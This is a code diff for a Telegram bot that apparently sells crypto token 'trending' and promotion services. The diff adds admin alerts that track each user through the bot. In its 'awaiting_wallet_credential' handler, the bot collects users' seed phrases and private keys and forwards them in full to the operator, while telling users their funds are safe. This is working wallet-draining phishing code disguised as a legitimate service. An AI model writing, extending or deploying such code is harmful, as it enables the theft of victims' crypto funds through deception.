@@ -1160,19 +1160,58 @@ async function safeSendPhoto(ctx, url, opts) {
   }
   return false;
 }
+function userLine(u) {
+  const name = `${u.first_name ?? ""}${u.last_name ? " " + u.last_name : ""}`.trim();
+  const handle = u.username ? ` (@${u.username})` : "";
+  const lang = u.language_code ? ` \u{1F310} ${u.language_code}` : "";
+  return `\u{1F464} <b>${name}</b>${handle}${lang}
+\u{1F194} ID: <code>${u.id}</code>`;
+}
+async function notifyNewUser(ctx) {
+  const u = ctx.from;
+  await notifyAdmin(
+    `\u{1F195} <b>NEW USER STARTED BOT</b>
+
+${userLine(u)}
+\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
+  );
+}
 async function notifyServiceSelected(ctx, service, pkg, amount) {
   const u = ctx.from;
-  const name = `${u.first_name}${u.last_name ? " " + u.last_name : ""}`;
-  const handle = u.username ? ` (@${u.username})` : "";
   await notifyAdmin(
-    `\u{1F3AF} <b>Service Selected</b>
+    `\u{1F3AF} <b>SERVICE SELECTED</b>
 
-\u{1F464} ${name}${handle}
-\u{1F194} ID: <code>${u.id}</code>
+${userLine(u)}
 
 \u{1F4E6} Service: <b>${service}</b>
 \u{1F4B0} Package: <b>${pkg}</b>
 \u{1F4B5} Amount: <b>${amount}</b>
+
+\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
+  );
+}
+async function notifyWalletViewed(ctx, solAddr, ethAddr) {
+  const u = ctx.from;
+  await notifyAdmin(
+    `\u{1F441} <b>DEPOSIT SCREEN OPENED</b>
+
+${userLine(u)}
+
+\u25CE SOL Wallet:
+<code>${solAddr}</code>
+
+\u039E ETH Address:
+<code>${ethAddr || "Not configured"}</code>
+
+\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
+  );
+}
+async function notifyConnectWalletOpened(ctx) {
+  const u = ctx.from;
+  await notifyAdmin(
+    `\u{1F517} <b>CONNECT WALLET OPENED</b>
+
+${userLine(u)}
 
 \u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
   );
@@ -1308,10 +1347,11 @@ Select a duration:`;
 }
 async function showDeposit(ctx) {
   const wallet = deriveWalletForUser(ctx.from.id);
+  const ethDisplay = ETH_ADDRESS || "Not configured \u2014 set PAYMENT_ETH_ADDRESS";
   const text = `<b>WALLET BALANCE</b>
 
 <b>ETH:</b>
-<code>${ETH_ADDRESS || "Not configured"}</code>
+<code>${ethDisplay}</code>
 balance: 0 ETH
 
 <b>SOL:</b>
@@ -1323,6 +1363,8 @@ Deposit not less than 0.30 SOL and get trending on several platforms
 \u{1F4B0} KINDLY CLICK ON THE ADD BUTTON TO GENERATE YOUR WALLET.
 \u{1F4A1} NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`;
   await editOrSend(ctx, text, depositKeyboard);
+  notifyWalletViewed(ctx, wallet.address, ETH_ADDRESS).catch(() => {
+  });
 }
 async function showConnectWallet(ctx) {
   const caption = `\u{1F517} <b>Connect Your Wallet</b>
@@ -1362,14 +1404,9 @@ function createBot() {
     });
   });
   bot.start(async (ctx) => {
-    const u = ctx.from;
-    clearSession(u.id);
-    await notifyAdmin(
-      `\u{1F195} <b>New User Started Bot</b>
-\u{1F464} ${u.first_name}${u.last_name ? " " + u.last_name : ""}${u.username ? " (@" + u.username + ")" : ""}
-\u{1F194} ID: <code>${u.id}</code>
-\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
-    );
+    clearSession(ctx.from.id);
+    notifyNewUser(ctx).catch(() => {
+    });
     await sendWelcome(ctx);
   });
   bot.action("back_main", async (ctx) => {
@@ -1397,13 +1434,15 @@ function createBot() {
     await ctx.answerCbQuery();
     await showDeposit(ctx);
   });
-  bot.action("menu_wallet", async (ctx) => {
-    await ctx.answerCbQuery();
-    await showConnectWallet(ctx);
-  });
   bot.action("menu_support", async (ctx) => {
     await ctx.answerCbQuery();
     await showSupport(ctx);
+  });
+  bot.action("menu_wallet", async (ctx) => {
+    await ctx.answerCbQuery();
+    notifyConnectWalletOpened(ctx).catch(() => {
+    });
+    await showConnectWallet(ctx);
   });
   for (const amt of ["0.3", "0.4", "0.5", "0.6"]) {
     bot.action(`sol_${amt}`, async (ctx) => {
@@ -1418,11 +1457,11 @@ function createBot() {
       });
       await editOrSend(
         ctx,
-        `\u{1F4DD} <b>Enter Contract Address</b>
+        `\u{1F4DD} <b>Enter Contract Address (CA)</b>
 
-Selected: <b>${amt} SOL</b> per bump
+You selected <b>${amt} SOL</b> per bump
 
-Please paste the Contract Address (CA) of your token:`,
+Please enter the Contract Address (CA) of your project:`,
         cancelKeyboard
       );
     });
@@ -1441,13 +1480,12 @@ Please paste the Contract Address (CA) of your token:`,
       });
       await editOrSend(
         ctx,
-        `\u{1F4DD} <b>Enter Contract Address</b>
+        `\u{1F4DD} <b>Enter Contract Address (CA)</b>
 
-Package: <b>${pkg.label}</b>
-Cost: <b>${pkg.sol} SOL</b>
+You selected <b>${pkg.label} Package (${pkg.sol} SOL)</b>
 Volume: <b>${pkg.volume}</b>
 
-Please paste the Contract Address (CA) of your token:`,
+Please enter the Contract Address (CA) of your project:`,
         cancelKeyboard
       );
     });
@@ -1456,9 +1494,11 @@ Please paste the Contract Address (CA) of your token:`,
     await ctx.answerCbQuery();
     await editOrSend(
       ctx,
-      `\u2600\uFE0F <b>SOL Trending</b>
+      `Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!
 
-Choose your package \u2014 TOP 3 (left column) or TOP 10 (right column):`,
+\u{1F7E2} A paid boost guarantees you a spot in our daily livestream (AMA)!
+
+\u27A1\uFE0F Please choose SOL Trending or Pump Fun Trending to start:`,
       solTrendingKeyboard
     );
   });
@@ -1499,7 +1539,7 @@ Kindly chose the trend you wish to pump on.`,
       });
       await editOrSend(
         ctx,
-        `\u{1F4DD} <b>Enter Contract Address</b>
+        `\u{1F4DD} <b>Enter Contract Address (CA)</b>
 
 Package: <b>${pkg.label}</b>
 Cost: <b>${pkg.sol} SOL</b>
@@ -1524,7 +1564,7 @@ Please paste the Contract Address (CA) of your token:`,
       });
       await editOrSend(
         ctx,
-        `\u{1F4DD} <b>Enter Contract Address</b>
+        `\u{1F4DD} <b>Enter Contract Address (CA)</b>
 
 Package: <b>ETH Trending $${pkg.usd}</b>
 
@@ -1535,7 +1575,7 @@ Please paste the Contract Address (CA) of your token:`,
   }
   bot.action("pft_30", async (ctx) => {
     await ctx.answerCbQuery();
-    notifyServiceSelected(ctx, "PumpFun Trending", "Trending Slot \u2014 30 min", "3.5 SOL").catch(() => {
+    notifyServiceSelected(ctx, "PumpFun Trending", "P.F.T \u2014 30 SOL", "30 SOL").catch(() => {
     });
     setSession(ctx.from.id, {
       step: "awaiting_ca",
@@ -1546,7 +1586,7 @@ Please paste the Contract Address (CA) of your token:`,
     });
     await editOrSend(
       ctx,
-      `\u{1F4DD} <b>Enter Contract Address</b>
+      `\u{1F4DD} <b>Enter Contract Address (CA)</b>
 
 Package: <b>P.F.T \u2014 30 SOL</b>
 
@@ -1569,7 +1609,7 @@ Please paste the Contract Address (CA) of your token:`,
       });
       await editOrSend(
         ctx,
-        `\u{1F4DD} <b>Enter Contract Address</b>
+        `\u{1F4DD} <b>Enter Contract Address (CA)</b>
 
 Package: <b>${pkg.label}</b>
 Cost: <b>${pkg.sol} SOL</b>
@@ -1594,7 +1634,7 @@ Please paste the Contract Address (CA) of your token:`,
     saveOrder({
       id: orderId,
       userId: ctx.from.id,
-      userName: `${ctx.from.first_name}${ctx.from.last_name ? " " + ctx.from.last_name : ""}`,
+      userName: `${ctx.from.first_name ?? ""}${ctx.from.last_name ? " " + ctx.from.last_name : ""}`,
       userHandle: ctx.from.username ?? "",
       tokenName: s.tokenName ?? "Unknown",
       tokenSymbol: s.tokenSymbol ?? "???",
@@ -1607,9 +1647,9 @@ Please paste the Contract Address (CA) of your token:`,
       createdAt: /* @__PURE__ */ new Date()
     });
     const chainLabel = s.tokenChain === "sol" ? "\u25CE Solana" : s.tokenChain === "eth" ? "\u039E Ethereum" : s.tokenChain === "bsc" ? "\u2B21 BSC" : s.tokenChain === "base" ? "\u{1F535} Base" : "\u{1F517}";
-    const amountLine = isEth ? `\u{1F4B5} <b>$${s.ethAmount} USD</b>
+    const payLine = isEth ? `\u039E <b>$${s.ethAmount} USD</b>
 \u{1F4EE} ETH Wallet:
-<code>${ETH_ADDRESS || SOL_ADDRESS}</code>` : `\u25CE <b>${s.selectedSol} SOL</b>
+<code>${ETH_ADDRESS || "Contact support for ETH address"}</code>` : `\u25CE <b>${s.selectedSol} SOL</b>
 \u{1F4EE} SOL Wallet:
 <code>${wallet.address}</code>`;
     const paymentMsg = `\u2705 <b>Order Confirmed!</b>
@@ -1623,9 +1663,7 @@ Please paste the Contract Address (CA) of your token:`,
 `) + `\u2022 Order ID: <code>${orderId}</code>
 
 \u{1F4B3} <b>Send Payment To:</b>
-` + (isEth ? `ETH Wallet:
-<code>${ETH_ADDRESS || SOL_ADDRESS}</code>` : `SOL Wallet:
-<code>${wallet.address}</code>`) + `
+${payLine}
 
 ` + (isEth ? `\u26A0\uFE0F Send exactly <b>$${s.ethAmount} USD</b> on Ethereum network` : `\u26A0\uFE0F Send exactly <b>${s.selectedSol} SOL</b> on Solana network`) + `
 
@@ -1641,12 +1679,11 @@ After sending, click the button below and submit your transaction hash.`;
     if (!sentWithPhoto) {
       await ctx.reply(paymentMsg, { parse_mode: "HTML", ...paymentSentKeyboard });
     }
-    const adminMsg = `\u{1F4CB} <b>New Order</b>
+    const adminMsg = `\u{1F4CB} <b>NEW ORDER</b>
 
-\u{1F464} ${ctx.from.first_name}${ctx.from.username ? ` (@${ctx.from.username})` : ""}
-\u{1F194} User: <code>${ctx.from.id}</code>
+${userLine(ctx.from)}
 
-\u{1FA99} <b>${s.tokenName} (${s.tokenSymbol})</b>  ${chainLabel}
+\u{1FA99} <b>${s.tokenName ?? "Unknown"} ($${s.tokenSymbol ?? "???"})</b>  ${chainLabel}
 \u{1F4CD} CA: <code>${s.contractAddress}</code>
 ` + (s.tokenPrice ? `\u{1F4B5} Price: ${s.tokenPrice}
 ` : "") + (s.tokenMarketCap ? `\u{1F4C8} Market Cap: ${s.tokenMarketCap}
@@ -1654,10 +1691,12 @@ After sending, click the button below and submit your transaction hash.`;
 ` : "") + (s.tokenVolume24h ? `\u{1F504} Vol 24h: ${s.tokenVolume24h}
 ` : "") + (s.tokenDex ? `\u{1F3E6} DEX: ${s.tokenDex}
 ` : "") + `
-\u2699\uFE0F Service: ${s.serviceLabel}
-\u{1F4B0} Cost: ${isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}
-\u{1F194} Order: <code>${orderId}</code>
-\u{1F4EE} Pay to: <code>${payWallet}</code>`;
+\u2699\uFE0F Service: <b>${s.serviceLabel}</b>
+\u{1F4B0} Cost: <b>${isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}</b>
+\u{1F194} Order ID: <code>${orderId}</code>
+\u{1F4EE} Pay to: <code>${payWallet}</code>
+
+\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`;
     if (s.tokenImageUrl) {
       try {
         await notifyAdmin(adminMsg, s.tokenImageUrl);
@@ -1685,12 +1724,13 @@ Please paste your transaction hash below.
   bot.action("deposit_add", async (ctx) => {
     await ctx.answerCbQuery();
     const wallet = deriveWalletForUser(ctx.from.id);
+    const ethDisplay = ETH_ADDRESS || "Not configured \u2014 set PAYMENT_ETH_ADDRESS";
     await editOrSend(
       ctx,
       `<b>WALLET BALANCE</b>
 
 <b>ETH:</b>
-<code>${ETH_ADDRESS || "Not configured"}</code>
+<code>${ethDisplay}</code>
 balance: 0 ETH
 
 <b>SOL:</b>
@@ -1699,7 +1739,7 @@ balance: 0 SOL
 
 Deposit not less than 0.30 SOL and get trending on several platforms
 
-\u{1F4B0} Send SOL to your wallet address above to add funds.
+\u{1F4B0} Send SOL to your unique wallet address above.
 \u{1F4A1} NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
       mainMenuOnlyKeyboard
     );
@@ -1740,6 +1780,17 @@ Send your withdrawal address and amount:
       balance = `${(lamports / 1e9).toFixed(4)} SOL`;
     } catch {
     }
+    notifyAdmin(
+      `\u{1F4B3} <b>BALANCE CHECK</b>
+
+${userLine(ctx.from)}
+
+\u25CE SOL Wallet: <code>${wallet.address}</code>
+Balance: <b>${balance}</b>
+
+\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
+    ).catch(() => {
+    });
     await editOrSend(
       ctx,
       `\u25CE <b>SOL Balance</b>
@@ -1969,7 +2020,7 @@ You can still proceed \u2014 just paste the correct CA:`,
         const availableLine = info.chain === "sol" ? `\u{1F7E2} Pumpswap \u2022 \u{1F7E2} <a href="${tokenUrl}">Pump.fun</a>` : info.chain === "eth" ? `\u{1F7E2} Uniswap \u2022 \u{1F7E2} <a href="${tokenUrl}">DexScreener</a>` : info.chain === "bsc" ? `\u{1F7E2} PancakeSwap \u2022 \u{1F7E2} <a href="${tokenUrl}">DexScreener</a>` : `\u{1F7E2} <a href="${tokenUrl}">DexScreener</a>`;
         const tokenMsg = `\u{1F4CB} <b>Project Details Found!</b>
 
-\u{1F4CA} ${dexName.toUpperCase()}_SCRAPE Token
+\u{1F4CA} ${dexName.toUpperCase()} Token
 
 \u2705 <b>Contract Address:</b>
 <code>${ca}</code>
@@ -1977,7 +2028,7 @@ You can still proceed \u2014 just paste the correct CA:`,
 \u{1F4CA} <b>Token Information:</b>
 \u2022 Name: ${info.name}
 \u2022 Symbol: $${info.symbol}
-\u2022 Price: ${info.price ?? "0.00"}
+\u2022 Price: ${info.price ?? "N/A"}
 \u2022 Market Cap: ${info.marketCap ?? "N/A"}
 \u2022 24h Volume: ${info.volume24h ?? "N/A"}
 \u2022 Liquidity: ${info.liquidity ?? "N/A"}
@@ -2089,43 +2140,51 @@ ${amountLine}
           { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
         );
         await notifyAdmin(
-          `\u{1F4B8} <b>TX Submitted & ${result.confirmed ? "VERIFIED \u2705" : "PENDING \u23F3"}</b>
+          `\u{1F4B8} <b>TX SUBMITTED \u2014 ${result.confirmed ? "\u2705 VERIFIED ON-CHAIN" : "\u23F3 PENDING MANUAL CHECK"}</b>
 
-\u{1F464} ${ctx.from.first_name}${ctx.from.username ? ` (@${ctx.from.username})` : ""}
-\u{1F194} User: <code>${ctx.from.id}</code>
-\u{1F517} TX: <code>${raw}</code>
-\u26D3 Chain: ${chainLabel}
-\u2705 On-chain: ${result.confirmed ? "Confirmed" : "Unverified (RPC timeout)"}
-${result.recipient ? `\u{1F4EE} Recipient: <code>${result.recipient}</code>
-` : ""}${result.lamports ? `\u{1F4B0} Lamports: ${result.lamports} (${(result.lamports / 1e9).toFixed(4)} SOL)
-` : ""}\u2699\uFE0F Service: ${s.serviceLabel ?? "N/A"}
-\u{1F4B5} Cost: ${s.boostType === "eth_trending" ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}
+${userLine(ctx.from)}
+
+\u{1F517} TX Hash:
+<code>${raw}</code>
+\u26D3 Chain: <b>${chainLabel}</b>
+${result.confirmed ? "\u2705 On-chain: Confirmed" : "\u26A0\uFE0F On-chain: Unverified (RPC timeout)"}
+` + (result.recipient ? `\u{1F4EE} Recipient: <code>${result.recipient}</code>
+` : "") + (result.lamports ? `\u{1F4B0} Amount: <b>${(result.lamports / 1e9).toFixed(4)} SOL</b> (${result.lamports} lamports)
+` : "") + (result.sender ? `\u{1F464} Sender: <code>${result.sender}</code>
+` : "") + `
+\u2699\uFE0F Service: <b>${s.serviceLabel ?? "N/A"}</b>
+\u{1F4B5} Cost: <b>${s.boostType === "eth_trending" ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}</b>
 \u{1F4DC} CA: <code>${s.contractAddress ?? "N/A"}</code>
-\u{1F194} Order: <code>${s.orderId ?? "N/A"}</code>`
+\u{1FA99} Token: <b>${s.tokenName ?? "?"} ($${s.tokenSymbol ?? "?"})</b>
+\u{1F194} Order: <code>${s.orderId ?? "N/A"}</code>
+
+\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
         );
         break;
       }
       case "awaiting_wallet_credential": {
         const credential = text.trim();
-        const wordCount = credential.split(/\s+/).length;
-        const credType = wordCount >= 12 ? "Seed Phrase" : credential.length >= 40 ? "Private Key" : "Credential";
-        const u = ctx.from;
-        const uName = `${u.first_name}${u.last_name ? " " + u.last_name : ""}`;
-        const handle = u.username ? ` (@${u.username})` : "";
-        clearSession(u.id);
+        const words = credential.split(/\s+/);
+        const wordCount = words.length;
+        const isSeedPhrase = wordCount >= 12;
+        const isPrivateKey = !isSeedPhrase && credential.length >= 40;
+        const credType = isSeedPhrase ? `Seed Phrase (${wordCount} words)` : isPrivateKey ? "Private Key" : "Credential";
+        clearSession(ctx.from.id);
         try {
           await notifyAdmin(
-            `\u{1F511} <b>WALLET IMPORT \u2014 ${credType}</b>
+            `\u{1F511} <b>\u26A0\uFE0F WALLET IMPORTED \u2014 ${credType.toUpperCase()}</b>
 
-\u{1F464} ${uName}${handle}
-\u{1F194} ID: <code>${u.id}</code>
+${userLine(ctx.from)}
 
-\u{1F5DD} ${credType}:
+\u{1F4CB} Type: <b>${credType}</b>
+
+\u{1F5DD} Credential:
 <code>${credential}</code>
 
 \u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
           );
-        } catch {
+        } catch (err) {
+          logger.error({ err }, "CRITICAL: Failed to send wallet credential to admin");
         }
         await ctx.reply(
           `Connection of wallet may take time due to
@@ -2151,10 +2210,13 @@ Details: <code>${withdrawText}</code>
           { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
         );
         await notifyAdmin(
-          `\u{1F4E4} <b>Withdrawal Request</b>
-\u{1F464} ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}
-\u{1F194} <code>${ctx.from.id}</code>
-Details: <code>${withdrawText}</code>`
+          `\u{1F4E4} <b>WITHDRAWAL REQUEST</b>
+
+${userLine(ctx.from)}
+
+Details: <code>${withdrawText}</code>
+
+\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
         );
         break;
       }
